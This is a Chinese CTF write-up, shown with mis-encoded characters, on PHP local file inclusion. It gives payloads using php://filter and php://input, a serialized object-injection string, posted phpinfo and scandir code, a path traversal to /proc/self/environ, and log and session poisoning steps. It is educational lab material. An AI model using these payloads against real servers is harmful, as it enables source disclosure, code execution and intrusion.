<p><strong>click</strong>ç‚¹å®Œå¹¶æ²¡æœ‰ä»€ä¹ˆæ”¶è·ï¼Œè€Œé¢˜ç›®æç¤º<strong>Flag</strong>åœ¨<strong>Index</strong>é‡Œé¢ï¼Œä½†æ˜¯æ— æ³•é€šè¿‡æŸ¥çœ‹æºç å¾—åˆ°æœ‰æ•ˆä¿¡æ¯ï¼Œå› æ­¤å°è¯•ä½¿ç”¨<strong>php://filter</strong>è·å–æºç ã€‚</p>
<p><strong>payload</strong>ä¸º<strong>?file=php://filter/convert.base64-encode/resource=index.php</strong>ã€‚</p>
<p>å¾—åˆ°<strong>flag{edulcni_elif_lacol_si_siht}</strong>ã€‚</p>
<p>æ­¤å¤„ä½¿ç”¨çš„<strong>php://filter</strong>æ¶‰åŠåˆ°<a
target="_blank" rel="noopener" href="http://php.net/manual/zh/wrappers.php.php">PHPä¼ªåè®®</a>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;      </span><br><span class="line">è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</span><br><span class="line">read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;          </span><br><span class="line">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</span><br><span class="line">write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;         </span><br><span class="line">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</span><br><span class="line">&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;           </span><br><span class="line">ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</span><br></pre></td></tr></table></figure>
<p>è¿‡æ»¤æ•°æ®æµä¸­ï¼Œè¿‡æ»¤å™¨æœ‰å¾ˆå¤šç§ï¼Œæœ‰å­—ç¬¦ä¸²è¿‡æ»¤å™¨ã€è½¬æ¢è¿‡æ»¤å™¨ã€å‹ç¼©è¿‡æ»¤å™¨ã€åŠ å¯†è¿‡æ»¤å™¨ã€‚</p>
<h5 id="å­—ç¬¦ä¸²è¿‡æ»¤å™¨">å­—ç¬¦ä¸²è¿‡æ»¤å™¨</h5>
<ul>
<li><strong>string.rot13 //</strong>è¿›è¡Œ<strong>rot13</strong>è½¬æ¢</li>
<li><strong>string.toupper //</strong>å°†å­—ç¬¦å…¨éƒ¨å¤§å†™</li>
<li><strong>string.tolower //</strong>å°†å­—ç¬¦å…¨éƒ¨å°å†™</li>
<li><strong>string.strip_tags
//</strong>å»é™¤ç©ºå­—ç¬¦ã€<strong>HTML</strong>å’Œ<strong>PHP</strong>æ ‡è®°åçš„ç»“æœ</li>
</ul>
<h5 id="è½¬æ¢è¿‡æ»¤å™¨">è½¬æ¢è¿‡æ»¤å™¨</h5>
<ul>
<li><strong>convert.base64-encode
//</strong>ç›¸å½“äºä½¿ç”¨<strong>base64_encode()</strong>å¤„ç†æ‰€æœ‰æµæ•°æ®</li>
<li><strong>convert.base64-decode
//</strong>ç›¸å½“äºä½¿ç”¨<strong>base64_decode()</strong>å¤„ç†æ‰€æœ‰æµæ•°æ®</li>
<li><strong>convert.quoted-printable-encode //</strong>æ— å¯¹åº”å‡½æ•°</li>
<li><strong>convert.quoted-printable-decode
//</strong>ç›¸å½“äºä½¿ç”¨<strong>quoted_printable_decode()</strong>å¤„ç†æ‰€æœ‰æµæ•°æ®</li>
</ul>
<h5 id="å‹ç¼©è¿‡æ»¤å™¨">å‹ç¼©è¿‡æ»¤å™¨</h5>
<ul>
<li><strong>zlib.deflate</strong></li>
<li><strong>zlib.inflate</strong></li>
<li><strong>bzip2.compress</strong></li>
<li><strong>bzip2.decompress</strong></li>
</ul>
<h5 id="åŠ å¯†è¿‡æ»¤å™¨">åŠ å¯†è¿‡æ»¤å™¨</h5>
<p><strong>mcrypt</strong>å’Œ<strong>mdecrypt</strong>ä½¿ç”¨<strong>libmcrypt</strong>æä¾›äº†å¯¹ç§°çš„åŠ å¯†å’Œè§£å¯†ã€‚è¿™ä¸¤ç»„è¿‡æ»¤å™¨éƒ½æ”¯æŒ
<strong>mcrypt</strong>æ‰©å±•åº“ä¸­ç›¸åŒçš„ç®—æ³•ï¼Œæ ¼å¼ä¸º<strong>mcrypt.ciphername</strong>ï¼Œå…¶ä¸­<strong>ciphername</strong>æ˜¯å¯†ç çš„åå­—ï¼Œå°†è¢«ä¼ é€’ç»™<strong>mcrypt_module_open()</strong>ã€‚æœ‰ä»¥ä¸‹äº”ä¸ªè¿‡æ»¤å™¨å‚æ•°å¯ç”¨ï¼š</p>
<table>
<colgroup>
<col style="width: 13%" />
<col style="width: 7%" />
<col style="width: 31%" />
<col style="width: 47%" />
</colgroup>
<thead>
<tr class="header">
<th>å‚æ•°</th>
<th>æ˜¯å¦å¿…é¡»</th>
<th>é»˜è®¤å€¼</th>
<th>å–å€¼ä¸¾ä¾‹</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>mode</td>
<td>å¯é€‰</td>
<td>cbc</td>
<td>cbc, cfb, ecb, nofb, ofb, stream</td>
</tr>
<tr class="even">
<td>algorithms_dir</td>
<td>å¯é€‰</td>
<td>ini_get('mcrypt.algorithms_dir')</td>
<td>algorithms æ¨¡å—çš„ç›®å½•</td>
</tr>
<tr class="odd">
<td>modes_dir</td>
<td>å¯é€‰</td>
<td>ini_get('mcrypt.modes_dir')</td>
<td>modes æ¨¡å—çš„ç›®å½•</td>
</tr>
<tr class="even">
<td>iv</td>
<td>å¿…é¡»</td>
<td>N/A</td>
<td>å…¸å‹ä¸º 8ï¼Œ16 æˆ– 32 å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®ã€‚æ ¹æ®å¯†ç è€Œå®š</td>
</tr>
<tr class="odd">
<td>key</td>
<td>å¿…é¡»</td>
<td>N/A</td>
<td>å…¸å‹ä¸º 8ï¼Œ16 æˆ– 32 å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®ã€‚æ ¹æ®å¯†ç è€Œå®š</td>
</tr>
</tbody>
</table>
<h4 id="x03-welcome-to-bugkuctf">0x03 <a
target="_blank" rel="noopener" href="http://120.24.86.145:8006/test1/">welcome to bugkuctf</a></h4>
<p><strong>BugKu</strong>çš„ä¸€é“é¢˜ï¼Œæºç ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(file_get_cont	<span class="title function_ invoke__">ents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">--&gt;  </span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„æœ‰ä¸‰ç‚¹æ³¨æ„ï¼š</p>
<ol type="1">
<li><strong>isset($user)</strong>è¿™é‡Œå¿…é¡»è¦ä¼ å…¥è¿™ä¸ª<strong>user</strong>å˜é‡ã€‚</li>
<li><strong>file_get_contents</strong>ä½œç”¨æ˜¯æŠŠæ–‡ä»¶è¯»å…¥å­—ç¬¦ä¸²ï¼Œæ­¤å¤„è¿™å¥è¯å°±æ˜¯æŠŠ<strong>user</strong>æ–‡ä»¶è¯»å‡ºæ¥çš„å†…å®¹éœ€è¦æ˜¯<strong>welcome
to the bugkuctf</strong>ã€‚</li>
<li><strong>include($file);
//hint.php</strong>æç¤ºä»¥ä¸Šæ¡ä»¶æ»¡è¶³åè¯»å–<strong>hint.php</strong>æ–‡ä»¶ã€‚</li>
</ol>
<p>è€Œæ­¤å¤„ä¸ºäº†æ»¡è¶³ç¬¬äºŒä¸ªæ¡ä»¶åˆ™éœ€è¦ä½¿ç”¨åˆ°<strong>php://input</strong>è¿™ä¸ª<a
target="_blank" rel="noopener" href="http://php.net/manual/zh/wrappers.php.php"><strong>PHP</strong>ä¼ªåè®®</a>ã€è¯¦ç»†ä½œç”¨å°±æ˜¯ä¼ è¿›å»çš„å‚æ•°åœ¨ä½œä¸ºæ–‡ä»¶æ‰“å¼€çš„æ—¶å€™ï¼Œé€šè¿‡<strong>Post</strong>æ–¹å¼ä¼ å…¥çš„å€¼å°±ä½œä¸ºæ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p>å› æ­¤æ„é€ çš„<strong>payload</strong>ä¸º<strong>?txt=php://input</strong>ï¼Œå†<strong>Post</strong>ä¼ å…¥<strong>welcome
to the bugkuctf</strong>å°±å¯ä»¥çœ‹åˆ°å›æ˜¾ï¼Œä¸è¿‡ä¸ºä»€ä¹ˆæ˜¯<strong>hello
friend!</strong>ã€é›¾ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™æ˜¾ç„¶è¿˜ä¸èƒ½æ‹¿åˆ°flagï¼Œå†ç»“åˆä¸Šé¢ç¬¬ä¸‰ç‚¹çš„<strong>include($file);
//hint.php</strong>ï¼Œè¿™æ˜¯å¯ä»¥ä½¿ç”¨<strong>php://filter</strong>ä¼ªåè®®æ¥è¯»å‡º<strong>hint.php</strong>çš„å†…å®¹ã€‚</p>
<p>æ‰€ä»¥æ„é€ <strong>?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</strong>ã€‚</p>
<p>å¾—åˆ°äº†<strong>hint.php</strong>æºç ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸¶æ¿€åŠ¨ï¼Œäºæ˜¯ç›´æ¥è¯»äº†<strong>flag.php</strong>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ã¤Â¸ÂÃ¨Æ’Â½Ã§Å½Â°Ã¥Å“Â¨Ã¥Â°Â±Ã§Â»â„¢Ã¤Â½ flagÃ¥â€œÂ¦</span><br></pre></td></tr></table></figure>
<p>ä»€ä¹ˆä¹±ä¸ƒå…«ç³Ÿçš„ã€é›¾ã€‚</p>
<p>é‚£å†è¯»ä¸€ä¸‹<strong>index.php</strong>çš„æºç ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;ä¸èƒ½ç°åœ¨å°±ç»™ä½ flagå“¦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¯ä»¥ä»ç¬¬å…«è¡Œå¼€å§‹çœ‹åˆ°å¦‚æœä¹‹å‰å°è¯•è¯»<strong>flag</strong>å°±ä¼šè¢«é‚£ä¸ª<strong>preg_match</strong>ç›´æ¥ç»™<strong>exit</strong>æ‰ã€‚</p>
<p>ä½†åä¸‰è¡Œç»™äº†ä¸€ä¸ªé‡è¦çš„ä¿¡æ¯æ˜¯<strong>unserialize</strong>å‡½æ•°ï¼Œå¤§æ„æ˜¯è¯´è‹¥ä¼ å…¥çš„<strong>file</strong>å‚æ•°ä¸å«<strong>flag</strong>å­—ç¬¦ä¸²çš„è¯å°±æŠŠå®ƒåŒ…å«è¿›æ¥ï¼Œå¹¶ä¸”åºåˆ—åŒ–<strong>password</strong>å‚æ•°ã€‚</p>
<p>è€Œ<strong>flag.php</strong>åˆ™å¤§æ„æ˜¯è‹¥<strong>file</strong>ä¼ å‚è¿›æ¥çš„æ–‡ä»¶å­˜åœ¨åˆ™è¾“å‡ºè¯¥æ–‡ä»¶ã€‚</p>
<p>é‚£ä¹ˆç°åœ¨çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯æ„é€ è¯»å–<strong>flag.php</strong>çš„ä»£ç å¹¶å°†å…¶åºåˆ—åŒ–åçš„å€¼ä¼ ç»™<strong>password</strong>æ‰§è¡Œã€‚</p>
<p>ç”±äºå¯¹åºåˆ—åŒ–è¿™ä¸€å—è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‰€ä»¥æŠ„äº†ä¸€ä¸‹ä½œä¸š<strong>XD</strong>ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();  </span><br><span class="line">    <span class="variable">$a</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  </span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°åºåˆ—åŒ–åçš„å€¼æ˜¯<strong>O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</strong>
ã€‚</p>
<p>æœ€ç»ˆçš„<strong>payload</strong>æ˜¯<strong>?txt=php://input&amp;file=hint.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</strong>ã€‚</p>
<p>å¾—åˆ°<strong>flag</strong>æ˜¯<strong>flag{php_is_the_best_language}</strong>ã€‚</p>
<h4 id="x04-level-3--double-agent">0x04 <a
target="_blank" rel="noopener" href="http://level3.tasteless.eu/">Level 3- Double Agent</a></h4>
<p>è¿™é¢˜æ¥è‡ª<strong>Tasteless CTF</strong>ã€‚</p>
<p>æºç å¦‚ä¸‹ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">view file: php.ini</span></span><br><span class="line"><span class="comment">so here is my hint: the included php.ini file is part of the configugartion file used on the server the bug was found.</span></span><br><span class="line"><span class="comment">so there will be something in it which enables you to solve this level, wont?</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">always be UP TO DATE!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">hint enough, might just take you seconds to do?!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;anti_rfi.php&#x27;</span>); <span class="comment">//rfi is forbidden!!!!!</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$inc</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">@<span class="keyword">require_once</span>(<span class="variable">$inc</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„æœ‰å‡ ä¸ªæç¤ºï¼Œä¸€æ˜¯è¯´ç¦æ­¢äº†<strong>RFI</strong>ï¼Œå¦ä¸€ä¸ªæ˜¯è¯´åœ¨<strong>PHP.ini</strong>ä¸­æœ‰æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p>æ‰“å¼€ä¼šçœ‹åˆ°ä¸€ä¸ª<strong>allow_url_include=On</strong>è¡¨åæ­¤å¤„å¯ä»¥ä½¿ç”¨<a
target="_blank" rel="noopener" href="http://php.net/manual/zh/wrappers.php.php">PHPä¼ªåè®®</a>ã€ä»…
<strong>php://inputã€
php://stdinã€php://memoryå’Œphp://temp</strong>ï¼Œè€Œ<strong>enctype="multipart/form-data"</strong>æ—¶åˆ™æ— æ³•ä½¿ç”¨<strong>php://input</strong>ã€‚</p>
<p>è€Œ<strong>allow_url_fopen=Off</strong>åˆ™è¡¨æ˜æ— æ³•è¿›è¡Œè¿œç¨‹è¯»å–ï¼Œå³ä½¿ç”¨èœåˆ€è¿æ¥ã€‚</p>
<p>æ„é€ <strong>?file=php://input</strong>åå°è¯•<strong>Post</strong>å¦‚ä¸‹æ•°æ®æ¥è·å–æ›´å¤šä¿¡æ¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¯ä»¥å¾—åˆ°ä¸€ä¸ª<strong>Web</strong>æœåŠ¡çš„è·¯å¾„ä¸º<strong>/var/www/chall/level3</strong>ã€‚</p>
<p>é‚£ä¹ˆç°åœ¨ä½¿ç”¨ä¸€ä¸ª<strong>scandir()</strong>å‡½æ•°æ¥è·å–ç›®å½•ä¸‹çš„æ–‡ä»¶åã€‚</p>
<p>æ„é€ <strong>?file=php://input</strong>å<strong>Post</strong>ä¸€ä¸ªæ•°æ®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php print_r(scandir(&#x27;/var/www/chall/level3&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
<p>å°±èƒ½çœ‹åˆ°<strong>flag</strong>æ–‡ä»¶å­˜æ”¾çš„ä½ç½®äº†ã€‚</p>
<h4 id="x05-åˆ©ç”¨procselfenviron">0x05 <a
target="_blank" rel="noopener" href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/#proc-self-environ">åˆ©ç”¨/proc/self/environ</a></h4>
<p>æ¥ä¸‹æ¥çš„ä¸€äº›æ˜¯æ‰¾ä¸åˆ°ä¾‹é¢˜çš„æˆ‘åªå¥½æŠ±ç€åˆ«äººçš„åšå®¢æ…¢æ…¢å•ƒçš„XDã€‚</p>
<p><strong>/proc/self/environ</strong>æ˜¯å½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ã€‚å‡è®¾è¿™æ—¶æœ‰ä¸€ä¸ªä¸åšè¿‡æ»¤çš„<strong>index.php</strong>ï¼Œä¸”<strong>/proc/self/environ</strong>æœ‰è¯»å†™æƒé™ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;$file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆæ­¤å¤„æŠ“åŒ…ä¿®æ”¹<strong>http</strong>è¯·æ±‚å¤´å¯ä»¥å‘ç°è®¿é—®<strong>?file=../../../../../../../../proc/self/environ</strong>çš„æ—¶å€™è¯¥æ–‡ä»¶å†…å®¹æœ‰æ‰€æ”¹å˜ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ„é€ æ¶æ„çš„ä»£ç åœ¨<strong>http</strong>è¯·æ±‚å¤´ä¸­ï¼Œä»è€Œè¯»å†™è¯¥æ–‡ä»¶ã€‚</p>
<h4 id="x06-åˆ©ç”¨æ—¥å¿—æ–‡ä»¶æ±¡æŸ“">0x06 <a
target="_blank" rel="noopener" href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%B1%A1%E6%9F%93">åˆ©ç”¨æ—¥å¿—æ–‡ä»¶æ±¡æŸ“</a></h4>
<p>é€šå¸¸ï¼Œè®¿é—®ç›®æ ‡ç³»ç»Ÿä¸Šçš„æŸäº›å¯¹å¤–å¼€æ”¾çš„æœåŠ¡æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å°†è®¿é—®è®°å½•å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨è¿™ä¸ªæœºåˆ¶ï¼Œæœ‰å¯èƒ½ä¼šå°†ä»£ç å†™å…¥åˆ°æ—¥å¿—ä¸­ã€‚</p>
<p>æ­¤æ“ä½œçš„å‰æé€šå¸¸éœ€è¦åšåˆ°ä»¥ä¸‹ä¸‰ç‚¹ã€‚</p>
<ol type="1">
<li><p>æ‰¾åˆ°æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶ä¸”<strong>æœ‰è®¿é—®å’Œæ‰§è¡Œæƒé™</strong>ã€åŒ…æ‹¬æ‰€æœ‰ä¸Šçº§ç›®å½•è®¿é—®å’Œæ‰§è¡Œæƒé™ã€‚</p></li>
<li><p>ncæäº¤æœ¨é©¬è‡³å¯¹æ–¹ç«¯å£ï¼Œä¼šè¢«å†™å…¥å¯¹æ–¹çš„æ—¥å¿—æ–‡ä»¶ã€‚</p></li>
<li><p>åŒ…å«æ—¥å¿—æ–‡ä»¶æ‰§è¡Œä»£ç ã€‚</p></li>
</ol>
<p>ä¸€èˆ¬æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„å¦‚ä¸‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line">/var/log/access_log</span><br><span class="line">/var/log/apache2/access.log</span><br></pre></td></tr></table></figure>
<h4 id="x07-åŒ…å«sessionæ–‡ä»¶">0x07 <a
target="_blank" rel="noopener" href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/#%E5%8C%85%E5%90%ABSESSION%E6%96%87%E4%BB%B6">åŒ…å«SESSIONæ–‡ä»¶</a></h4>
<p>sessionæ–‡ä»¶æ ¼å¼ä¸º<strong>sess_[phpsessid]</strong>ï¼Œ<strong>phpsessid</strong>ä½œä¸º<strong>cookie</strong>ä¼ é€’ï¼Œåœ¨æœåŠ¡ç«¯æ–‡ä»¶ä½ç½®ä¼šå˜åŒ–ã€‚</p>
